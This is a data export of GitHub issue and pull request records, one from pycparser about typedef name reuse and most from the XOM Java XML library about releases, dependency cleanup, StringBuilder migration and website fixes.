eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/2,15359840,MDExOlB1bGxSZXF1ZXN0NjIyNjM1MA==,2,Functions that don't have explicit return types are assumed to return int,4551516,closed,FALSE,NA,NA,0,2013-06-10T17:46:40Z,2013-06-12T13:16:48Z,2013-06-12T12:56:00Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/2/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/2/comments,https://api.github.com/repos/eliben/pycparser/issues/2/events,https://github.com/eliben/pycparser/pull/2,https://api.github.com/repos/eliben/pycparser/pulls/2
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/1,15359747,MDExOlB1bGxSZXF1ZXN0NjIyNjMyMA==,1,Redeclared types,4551516,closed,FALSE,NA,NA,11,2013-06-10T17:45:07Z,2014-06-16T12:13:28Z,2013-07-13T12:50:43Z,CONTRIBUTOR,NA,"While using pycparser to parse a large, existing codebase, I immediately came upon the typedef-name problem. The changes in this pull request resolve and test for the issues encountered; in particular:
- Reusing typedef names as structure/union member names
- Reusing typedef names as variables names in inner scopes
- Reusing typedef names as parameter names in declarations and definitions
- Duplicated typedef declarations (non-standard, but apparently common and syntactically
  similar to the above)

There is a corner case regarding parameter name scoping that required access to yacc.py's lookahead token (see p_direct_declarator_5 in c_parser.py for details). There are three solutions as I see it:
- Modify yacc.py to expose the lookahead token as an attribute of the parser (...but requiring future PLY updates to be merged, not copied)
- Keep track of the most-recent token via a custom tokenfunc (...but trusting that the parser's lookaheadstack is empty)
- Use the inspect module to grab the value of the parser's lookahead variable (...but direct
  inspection of Python frames and local dictionaries is pretty evil)

For the purpose of this change I decided to use the inspect module, as it is the least error-prone (it can inspect lookaheadstack to ensure it's empty) and the least invasive to the codebase. I can instead make lookahead/lookaheadstack attributes, if you're willing to support the merging of PLY.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/1/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/1/comments,https://api.github.com/repos/eliben/pycparser/issues/1/events,https://github.com/eliben/pycparser/pull/1,https://api.github.com/repos/eliben/pycparser/pulls/1
elharo,xom,https://api.github.com/repos/elharo/xom/issues/171,855260938,MDU6SXNzdWU4NTUyNjA5Mzg=,171,pom.xml should be updated to version 1.3.7,62425054,closed,FALSE,NA,NA,2,2021-04-11T09:27:21Z,2021-04-12T17:13:50Z,2021-04-12T17:13:50Z,NONE,NA,pom.xml should be updated to version 1.3.7,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/171/labels{/name},https://api.github.com/repos/elharo/xom/issues/171/comments,https://api.github.com/repos/elharo/xom/issues/171/events,https://github.com/elharo/xom/issues/171,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/170,849899910,MDExOlB1bGxSZXF1ZXN0NjA4NTY0OTA5,170,serve binaries from github,1005544,closed,FALSE,NA,NA,0,2021-04-04T15:35:13Z,2021-04-04T15:38:09Z,2021-04-04T15:38:05Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/170/labels{/name},https://api.github.com/repos/elharo/xom/issues/170/comments,https://api.github.com/repos/elharo/xom/issues/170/events,https://github.com/elharo/xom/pull/170,https://api.github.com/repos/elharo/xom/pulls/170
elharo,xom,https://api.github.com/repos/elharo/xom/issues/169,849898108,MDExOlB1bGxSZXF1ZXN0NjA4NTYzNjA0,169,serve binaries from github,1005544,closed,FALSE,NA,NA,0,2021-04-04T15:26:10Z,2021-04-04T15:27:29Z,2021-04-04T15:27:27Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/169/labels{/name},https://api.github.com/repos/elharo/xom/issues/169/comments,https://api.github.com/repos/elharo/xom/issues/169/events,https://github.com/elharo/xom/pull/169,https://api.github.com/repos/elharo/xom/pulls/169
elharo,xom,https://api.github.com/repos/elharo/xom/issues/168,842768187,MDExOlB1bGxSZXF1ZXN0NjAyMjYzMzg2,168,version 1.3.7,1005544,closed,FALSE,NA,NA,0,2021-03-28T15:59:08Z,2021-03-28T15:59:30Z,2021-03-28T15:59:27Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/168/labels{/name},https://api.github.com/repos/elharo/xom/issues/168/comments,https://api.github.com/repos/elharo/xom/issues/168/events,https://github.com/elharo/xom/pull/168,https://api.github.com/repos/elharo/xom/pulls/168
elharo,xom,https://api.github.com/repos/elharo/xom/issues/167,842765836,MDExOlB1bGxSZXF1ZXN0NjAyMjYxNjEy,167,remove unused class,1005544,closed,FALSE,NA,NA,0,2021-03-28T15:47:03Z,2021-03-28T15:48:08Z,2021-03-28T15:48:04Z,OWNER,NA,fixes #155,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/167/labels{/name},https://api.github.com/repos/elharo/xom/issues/167/comments,https://api.github.com/repos/elharo/xom/issues/167/events,https://github.com/elharo/xom/pull/167,https://api.github.com/repos/elharo/xom/pulls/167
elharo,xom,https://api.github.com/repos/elharo/xom/issues/166,842603936,MDExOlB1bGxSZXF1ZXN0NjAyMTQyMTAz,166,prefer StringBuilder,1005544,closed,FALSE,NA,NA,0,2021-03-27T21:18:05Z,2021-03-27T21:27:54Z,2021-03-27T21:27:51Z,OWNER,NA,fixes #147,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/166/labels{/name},https://api.github.com/repos/elharo/xom/issues/166/comments,https://api.github.com/repos/elharo/xom/issues/166/events,https://github.com/elharo/xom/pull/166,https://api.github.com/repos/elharo/xom/pulls/166
elharo,xom,https://api.github.com/repos/elharo/xom/issues/165,842603051,MDU6SXNzdWU4NDI2MDMwNTE=,165,Is Crimson still a thing?,1005544,open,FALSE,NA,NA,0,2021-03-27T21:12:33Z,2021-03-27T21:13:07Z,NA,OWNER,NA,If not we can remove references to it and special code for handling it. e.g. in XOMHandler,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/165/labels{/name},https://api.github.com/repos/elharo/xom/issues/165/comments,https://api.github.com/repos/elharo/xom/issues/165/events,https://github.com/elharo/xom/issues/165,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/164,842600764,MDExOlB1bGxSZXF1ZXN0NjAyMTM5Njk2,164,remove xml-apis since these are in the JDK now,1005544,closed,FALSE,NA,NA,0,2021-03-27T20:57:56Z,2021-03-27T21:01:50Z,2021-03-27T21:01:47Z,OWNER,NA,more on #158,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/164/labels{/name},https://api.github.com/repos/elharo/xom/issues/164/comments,https://api.github.com/repos/elharo/xom/issues/164/events,https://github.com/elharo/xom/pull/164,https://api.github.com/repos/elharo/xom/pulls/164
elharo,xom,https://api.github.com/repos/elharo/xom/issues/163,842599886,MDExOlB1bGxSZXF1ZXN0NjAyMTM5MDEy,163,use https links,1005544,closed,FALSE,NA,NA,0,2021-03-27T20:52:17Z,2021-03-27T20:54:10Z,2021-03-27T20:54:06Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/163/labels{/name},https://api.github.com/repos/elharo/xom/issues/163/comments,https://api.github.com/repos/elharo/xom/issues/163/events,https://github.com/elharo/xom/pull/163,https://api.github.com/repos/elharo/xom/pulls/163
elharo,xom,https://api.github.com/repos/elharo/xom/issues/162,842598873,MDU6SXNzdWU4NDI1OTg4NzM=,162,Can xerces and xalan dependencies be marked optional in pom.xml?,1005544,open,FALSE,NA,NA,0,2021-03-27T20:46:51Z,2021-03-27T20:46:51Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/162/labels{/name},https://api.github.com/repos/elharo/xom/issues/162/comments,https://api.github.com/repos/elharo/xom/issues/162/events,https://github.com/elharo/xom/issues/162,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/161,842598093,MDExOlB1bGxSZXF1ZXN0NjAyMTM3NjQ2,161,remove xml-apis since these are in the JDK now,1005544,closed,FALSE,NA,NA,0,2021-03-27T20:41:49Z,2021-03-27T20:46:33Z,2021-03-27T20:46:30Z,OWNER,NA,fixes #158,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/161/labels{/name},https://api.github.com/repos/elharo/xom/issues/161/comments,https://api.github.com/repos/elharo/xom/issues/161/events,https://github.com/elharo/xom/pull/161,https://api.github.com/repos/elharo/xom/pulls/161
elharo,xom,https://api.github.com/repos/elharo/xom/issues/160,841936384,MDU6SXNzdWU4NDE5MzYzODQ=,160,add robots.txt to website,1005544,open,FALSE,NA,NA,0,2021-03-26T12:58:54Z,2021-03-26T12:58:54Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/160/labels{/name},https://api.github.com/repos/elharo/xom/issues/160/comments,https://api.github.com/repos/elharo/xom/issues/160/events,https://github.com/elharo/xom/issues/160,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/159,841936271,MDU6SXNzdWU4NDE5MzYyNzE=,159,add favicon.ico to website,1005544,open,FALSE,NA,NA,0,2021-03-26T12:58:44Z,2021-03-26T12:58:44Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/159/labels{/name},https://api.github.com/repos/elharo/xom/issues/159/comments,https://api.github.com/repos/elharo/xom/issues/159/events,https://github.com/elharo/xom/issues/159,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/158,835698322,MDU6SXNzdWU4MzU2OTgzMjI=,158,Duplicate dependences import,10737804,closed,FALSE,NA,NA,3,2021-03-19T08:33:04Z,2021-03-27T20:46:30Z,2021-03-27T20:46:30Z,NONE,NA,"Hi,

I found project import different version of xml-apis.

Maybe need to exclude xml-apis in xalan and xerces.

![image](https://user-images.githubusercontent.com/10737804/111751913-0138b200-88d0-11eb-86c4-ea35a7917a59.png)

Thanks,
Alex
",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/158/labels{/name},https://api.github.com/repos/elharo/xom/issues/158/comments,https://api.github.com/repos/elharo/xom/issues/158/events,https://github.com/elharo/xom/issues/158,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/157,821602041,MDExOlB1bGxSZXF1ZXN0NTg0MzY0MzI5,157,version 1.3.6,1005544,closed,FALSE,NA,NA,0,2021-03-03T23:42:58Z,2021-03-04T19:22:58Z,2021-03-04T19:22:55Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/157/labels{/name},https://api.github.com/repos/elharo/xom/issues/157/comments,https://api.github.com/repos/elharo/xom/issues/157/events,https://github.com/elharo/xom/pull/157,https://api.github.com/repos/elharo/xom/pulls/157
elharo,xom,https://api.github.com/repos/elharo/xom/issues/156,821600834,MDExOlB1bGxSZXF1ZXN0NTg0MzYzMjIy,156,update READMEs too,1005544,closed,FALSE,NA,NA,0,2021-03-03T23:41:52Z,2021-03-03T23:43:13Z,2021-03-03T23:43:10Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/156/labels{/name},https://api.github.com/repos/elharo/xom/issues/156/comments,https://api.github.com/repos/elharo/xom/issues/156/events,https://github.com/elharo/xom/pull/156,https://api.github.com/repos/elharo/xom/pulls/156
elharo,xom,https://api.github.com/repos/elharo/xom/issues/155,818860850,MDU6SXNzdWU4MTg4NjA4NTA=,155,Dependency on JDK internal classes,4104715,closed,FALSE,1005544,NA,7,2021-03-01T13:21:06Z,2021-04-07T12:15:18Z,2021-03-28T15:48:04Z,NONE,NA,"Using JDK16, our project [WildFly Bootable JAR ](https://github.com/wildfly-extras/wildfly-jar-maven-plugin) fails due to nu.xom.JDK15XML1_0Parser accessing internal classes.
It seems a workaround for some old JDK 5 beta versions. Could we have a xom version without this internal access?
Thank-you.
PS: The original bug report: https://github.com/wildfly-extras/wildfly-jar-maven-plugin/issues/206
NB: We are in a context were we are excluding xerces:xercesImpl classes from xom, and fallback to the JDK15XML1_0Parser",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/155/labels{/name},https://api.github.com/repos/elharo/xom/issues/155/comments,https://api.github.com/repos/elharo/xom/issues/155/events,https://github.com/elharo/xom/issues/155,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/154,817917157,MDU6SXNzdWU4MTc5MTcxNTc=,154,Automate the release with a script,1005544,open,FALSE,NA,NA,0,2021-02-27T13:01:16Z,2021-02-27T13:01:16Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/154/labels{/name},https://api.github.com/repos/elharo/xom/issues/154/comments,https://api.github.com/repos/elharo/xom/issues/154/events,https://github.com/elharo/xom/issues/154,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/153,817917088,MDU6SXNzdWU4MTc5MTcwODg=,153,Automate version updates in docs,1005544,open,FALSE,NA,NA,0,2021-02-27T13:00:54Z,2021-02-27T13:00:54Z,NA,OWNER,NA,pull out of build.xml somehow,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/153/labels{/name},https://api.github.com/repos/elharo/xom/issues/153/comments,https://api.github.com/repos/elharo/xom/issues/153/events,https://github.com/elharo/xom/issues/153,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/152,817916600,MDExOlB1bGxSZXF1ZXN0NTgxMzI1Mzc3,152,docs: update version number before releasing,1005544,closed,FALSE,NA,NA,0,2021-02-27T12:57:56Z,2021-02-27T13:02:06Z,2021-02-27T13:02:02Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/152/labels{/name},https://api.github.com/repos/elharo/xom/issues/152/comments,https://api.github.com/repos/elharo/xom/issues/152/events,https://github.com/elharo/xom/pull/152,https://api.github.com/repos/elharo/xom/pulls/152
elharo,xom,https://api.github.com/repos/elharo/xom/issues/151,817916179,MDExOlB1bGxSZXF1ZXN0NTgxMzI1MDYy,151,update to 1.3.6,1005544,closed,FALSE,NA,NA,0,2021-02-27T12:55:36Z,2021-02-27T12:58:31Z,2021-02-27T12:58:13Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/151/labels{/name},https://api.github.com/repos/elharo/xom/issues/151/comments,https://api.github.com/repos/elharo/xom/issues/151/events,https://github.com/elharo/xom/pull/151,https://api.github.com/repos/elharo/xom/pulls/151
elharo,xom,https://api.github.com/repos/elharo/xom/issues/150,817914121,MDExOlB1bGxSZXF1ZXN0NTgxMzIzNTU4,150,release 1.3.6,1005544,closed,FALSE,NA,NA,0,2021-02-27T12:43:55Z,2021-02-27T12:52:12Z,2021-02-27T12:52:08Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/150/labels{/name},https://api.github.com/repos/elharo/xom/issues/150/comments,https://api.github.com/repos/elharo/xom/issues/150/events,https://github.com/elharo/xom/pull/150,https://api.github.com/repos/elharo/xom/pulls/150
elharo,xom,https://api.github.com/repos/elharo/xom/issues/149,790131718,MDExOlB1bGxSZXF1ZXN0NTU4MzY4MjM5,149,version 1.3.5,1005544,closed,FALSE,NA,NA,0,2021-01-20T16:27:20Z,2021-01-20T18:48:31Z,2021-01-20T18:48:27Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/149/labels{/name},https://api.github.com/repos/elharo/xom/issues/149/comments,https://api.github.com/repos/elharo/xom/issues/149/events,https://github.com/elharo/xom/pull/149,https://api.github.com/repos/elharo/xom/pulls/149
elharo,xom,https://api.github.com/repos/elharo/xom/issues/148,790129546,MDExOlB1bGxSZXF1ZXN0NTU4MzY2MzY5,148,StringBuffer --> StringBuilder,1005544,closed,FALSE,NA,NA,0,2021-01-20T16:24:47Z,2021-01-20T16:25:50Z,2021-01-20T16:25:46Z,OWNER,NA,"For #147 

There are a few other uses outside of local variables that need more careful attention. ",NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/148/labels{/name},https://api.github.com/repos/elharo/xom/issues/148/comments,https://api.github.com/repos/elharo/xom/issues/148/events,https://github.com/elharo/xom/pull/148,https://api.github.com/repos/elharo/xom/pulls/148
elharo,xom,https://api.github.com/repos/elharo/xom/issues/147,789987776,MDU6SXNzdWU3ODk5ODc3NzY=,147,Use StringBuilder instead of StringBuffer,1005544,closed,FALSE,NA,NA,0,2021-01-20T13:39:47Z,2021-03-27T21:27:51Z,2021-03-27T21:27:51Z,OWNER,NA,Now that Java 1.5 is required there are a lot of internal uses of StringBuffer as local variables that can be converted to StringBuilders,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/147/labels{/name},https://api.github.com/repos/elharo/xom/issues/147/comments,https://api.github.com/repos/elharo/xom/issues/147/events,https://github.com/elharo/xom/issues/147,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/146,759631720,MDU6SXNzdWU3NTk2MzE3MjA=,146,Fix maven repository,8892300,closed,FALSE,NA,NA,1,2020-12-08T17:21:32Z,2020-12-08T17:30:38Z,2020-12-08T17:30:38Z,NONE,NA,"Hi,

Looking at maven repository https://mvnrepository.com/artifact/xom/xom, it says that the artifact was moved, but the new versions are still published on the old place.
",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/146/labels{/name},https://api.github.com/repos/elharo/xom/issues/146/comments,https://api.github.com/repos/elharo/xom/issues/146/events,https://github.com/elharo/xom/issues/146,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/145,709514127,MDU6SXNzdWU3MDk1MTQxMjc=,145,Compatibility with standard XML Apis,12692585,closed,FALSE,NA,NA,1,2020-09-26T10:40:59Z,2020-10-01T17:43:34Z,2020-10-01T17:43:34Z,NONE,NA,"Just discovered xom and like what what we see. The support for xml:id is particularly nice; Xerces doesn't support xml:id and this is a constant source of pain. One question that comes up is how compatible Xom is with standard APIs like SAX, StAX, JAXB, and w3c.dom. The Xom documentation doesn't speak to this...

In our system there are several cases where w3c.dom and JAXB objects are written to and read from XMLStreamWriters and XMLStreamReaders. Does XOM support this?

What about existing systems that work with w3c.dom? Is there an efficient way to convert xom to w3c.dom?  Or must the xml be serialized and deserialized?

BTW: xom has its own xinclude support but we use and are fine with [Xerces' built in support for XInclude](https://xerces.apache.org/xerces2-j/faq-xinclude.html). I assume it's okay to continue to use this as long as we continue to set the XInclude feature. ",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/145/labels{/name},https://api.github.com/repos/elharo/xom/issues/145/comments,https://api.github.com/repos/elharo/xom/issues/145/events,https://github.com/elharo/xom/issues/145,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/144,606998396,MDU6SXNzdWU2MDY5OTgzOTY=,144,Ant task to sign and build the bundle.jar,1005544,open,FALSE,NA,NA,0,2020-04-26T12:16:45Z,2020-04-26T12:16:45Z,NA,OWNER,NA,"

    git checkout master
    git pull
    ant clean
    ant maven2
    cd dist/maven2
    Sign the files:

$ gpg -ab xom-1.3.3.pom
$ gpg -ab xom-1.3.3.jar
$ gpg -ab xom-1.3.3-javadoc.jar
$ gpg -ab xom-1.3.3-sources.jar

    $ jar -cvf bundle.jar xom-1.3.3.pom xom-1.3.3.pom.asc xom-1.3.3.jar xom-1.3.3.jar.asc xom-1.3.3-javadoc.jar xom-1.3.3-javadoc.jar.asc xom-1.3.3-sources.jar xom-1.3.3-sources.jar.asc
",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/144/labels{/name},https://api.github.com/repos/elharo/xom/issues/144/comments,https://api.github.com/repos/elharo/xom/issues/144/events,https://github.com/elharo/xom/issues/144,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/143,606825751,MDExOlB1bGxSZXF1ZXN0NDA4OTQ4NjA0,143,add Automatic-Module-Name,1005544,closed,FALSE,NA,NA,0,2020-04-25T18:15:19Z,2020-04-26T12:12:56Z,2020-04-26T12:12:26Z,OWNER,NA,fixes #142,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/143/labels{/name},https://api.github.com/repos/elharo/xom/issues/143/comments,https://api.github.com/repos/elharo/xom/issues/143/events,https://github.com/elharo/xom/pull/143,https://api.github.com/repos/elharo/xom/pulls/143
elharo,xom,https://api.github.com/repos/elharo/xom/issues/142,606707658,MDU6SXNzdWU2MDY3MDc2NTg=,142,XOM 1.3.4 jar in Maven Central doesn't contain Automatic-Module-Name,15714253,closed,FALSE,1005544,NA,1,2020-04-25T07:05:23Z,2020-04-26T12:16:23Z,2020-04-26T12:16:23Z,NONE,NA,"From the [release notes](http://xom.nu/history.html), and from #127, I'd assume that the [jar in Maven Central](https://repo1.maven.org/maven2/xom/xom/1.3.4/xom-1.3.4.jar) would include the Automatic-Module-Name manifest entry, but it doesn't.
Since htmlparser is planning to modularize itself (see https://github.com/validator/htmlparser/issues/14), but depends on XOM, it would be very helpful if a XOM release with Automatic-Module-Name would be available in Maven Central.",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/142/labels{/name},https://api.github.com/repos/elharo/xom/issues/142/comments,https://api.github.com/repos/elharo/xom/issues/142/events,https://github.com/elharo/xom/issues/142,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/141,562196510,MDExOlB1bGxSZXF1ZXN0MzcyODQyNjgz,141,upload files to IBiblio first,1005544,closed,FALSE,NA,NA,0,2020-02-09T15:50:03Z,2020-02-09T16:12:49Z,2020-02-09T16:12:46Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/141/labels{/name},https://api.github.com/repos/elharo/xom/issues/141/comments,https://api.github.com/repos/elharo/xom/issues/141/events,https://github.com/elharo/xom/pull/141,https://api.github.com/repos/elharo/xom/pulls/141
elharo,xom,https://api.github.com/repos/elharo/xom/issues/140,562196157,MDExOlB1bGxSZXF1ZXN0MzcyODQyNDQw,140,update to 1.3.4,1005544,closed,FALSE,NA,NA,0,2020-02-09T15:47:41Z,2020-02-09T15:48:04Z,2020-02-09T15:48:00Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/140/labels{/name},https://api.github.com/repos/elharo/xom/issues/140/comments,https://api.github.com/repos/elharo/xom/issues/140/events,https://github.com/elharo/xom/pull/140,https://api.github.com/repos/elharo/xom/pulls/140
elharo,xom,https://api.github.com/repos/elharo/xom/issues/139,558766012,MDExOlB1bGxSZXF1ZXN0MzcwMDYxODg2,139,update links,1005544,closed,FALSE,NA,NA,0,2020-02-02T22:06:46Z,2020-02-02T22:07:40Z,2020-02-02T22:07:35Z,OWNER,NA,fixes #131,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/139/labels{/name},https://api.github.com/repos/elharo/xom/issues/139/comments,https://api.github.com/repos/elharo/xom/issues/139/events,https://github.com/elharo/xom/pull/139,https://api.github.com/repos/elharo/xom/pulls/139
elharo,xom,https://api.github.com/repos/elharo/xom/issues/138,558720227,MDExOlB1bGxSZXF1ZXN0MzcwMDI4MTM5,138,fail CI build on test failure,1005544,closed,FALSE,NA,NA,0,2020-02-02T16:26:08Z,2020-02-02T16:32:04Z,2020-02-02T16:32:00Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/138/labels{/name},https://api.github.com/repos/elharo/xom/issues/138/comments,https://api.github.com/repos/elharo/xom/issues/138/events,https://github.com/elharo/xom/pull/138,https://api.github.com/repos/elharo/xom/pulls/138
elharo,xom,https://api.github.com/repos/elharo/xom/issues/137,558697777,MDExOlB1bGxSZXF1ZXN0MzcwMDExNDU1,137,clean up sidebar,1005544,closed,FALSE,NA,NA,0,2020-02-02T13:38:15Z,2020-02-02T13:39:33Z,2020-02-02T13:39:29Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/137/labels{/name},https://api.github.com/repos/elharo/xom/issues/137/comments,https://api.github.com/repos/elharo/xom/issues/137/events,https://github.com/elharo/xom/pull/137,https://api.github.com/repos/elharo/xom/pulls/137
elharo,xom,https://api.github.com/repos/elharo/xom/issues/136,558697145,MDExOlB1bGxSZXF1ZXN0MzcwMDEwOTc1,136,Obscure email,1005544,closed,FALSE,NA,NA,0,2020-02-02T13:32:32Z,2020-02-02T13:32:44Z,2020-02-02T13:32:40Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/136/labels{/name},https://api.github.com/repos/elharo/xom/issues/136/comments,https://api.github.com/repos/elharo/xom/issues/136/events,https://github.com/elharo/xom/pull/136,https://api.github.com/repos/elharo/xom/pulls/136
elharo,xom,https://api.github.com/repos/elharo/xom/issues/135,558696556,MDExOlB1bGxSZXF1ZXN0MzcwMDEwNTM0,135,clean up licenses,1005544,closed,FALSE,NA,NA,0,2020-02-02T13:27:30Z,2020-02-02T13:31:19Z,2020-02-02T13:31:12Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/135/labels{/name},https://api.github.com/repos/elharo/xom/issues/135/comments,https://api.github.com/repos/elharo/xom/issues/135/events,https://github.com/elharo/xom/pull/135,https://api.github.com/repos/elharo/xom/pulls/135
elharo,xom,https://api.github.com/repos/elharo/xom/issues/134,558695558,MDU6SXNzdWU1NTg2OTU1NTg=,134,Fail website build if index.html or history.html is invalid,1005544,open,FALSE,NA,NA,0,2020-02-02T13:18:45Z,2020-02-02T15:32:05Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/134/labels{/name},https://api.github.com/repos/elharo/xom/issues/134/comments,https://api.github.com/repos/elharo/xom/issues/134/events,https://github.com/elharo/xom/issues/134,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/133,558694746,MDExOlB1bGxSZXF1ZXN0MzcwMDA5MTky,133,fix link to developerworks,1005544,closed,FALSE,NA,NA,0,2020-02-02T13:12:09Z,2020-02-02T13:14:35Z,2020-02-02T13:14:32Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/133/labels{/name},https://api.github.com/repos/elharo/xom/issues/133/comments,https://api.github.com/repos/elharo/xom/issues/133/events,https://github.com/elharo/xom/pull/133,https://api.github.com/repos/elharo/xom/pulls/133
elharo,xom,https://api.github.com/repos/elharo/xom/issues/132,558694110,MDU6SXNzdWU1NTg2OTQxMTA=,132,Make sidebar its own content,1005544,open,FALSE,NA,NA,0,2020-02-02T13:06:51Z,2020-02-02T13:07:05Z,NA,OWNER,NA,"The sidebar on the website is duplicated between index.html and history.html. Figure out how to extract this into a single file, probably by using some sort of client side assembly prior to publication. ",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/132/labels{/name},https://api.github.com/repos/elharo/xom/issues/132/comments,https://api.github.com/repos/elharo/xom/issues/132/events,https://github.com/elharo/xom/issues/132,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/131,556876604,MDU6SXNzdWU1NTY4NzY2MDQ=,131,Dead links in sidebar,1005544,closed,FALSE,NA,NA,0,2020-01-29T13:53:04Z,2020-02-02T22:07:34Z,2020-02-02T22:07:34Z,OWNER,NA,"See if we can find new URLs for these or remove them:

```
    <li><a href=""http://www-106.ibm.com/developerworks/library/x-matters32.html"">The XOM Java XML API</a></li>
    <li> <a href=""http://www.linux-mag.com/archive/2003-03/java_xom_01.html"">Java XOM: XML Made Simpler</a></li>
```",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/131/labels{/name},https://api.github.com/repos/elharo/xom/issues/131/comments,https://api.github.com/repos/elharo/xom/issues/131/events,https://github.com/elharo/xom/issues/131,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/130,556873507,MDExOlB1bGxSZXF1ZXN0MzY4NTY2MzQ5,130,more https,1005544,closed,FALSE,NA,NA,0,2020-01-29T13:48:16Z,2020-01-29T13:53:45Z,2020-01-29T13:53:40Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/130/labels{/name},https://api.github.com/repos/elharo/xom/issues/130/comments,https://api.github.com/repos/elharo/xom/issues/130/events,https://github.com/elharo/xom/pull/130,https://api.github.com/repos/elharo/xom/pulls/130
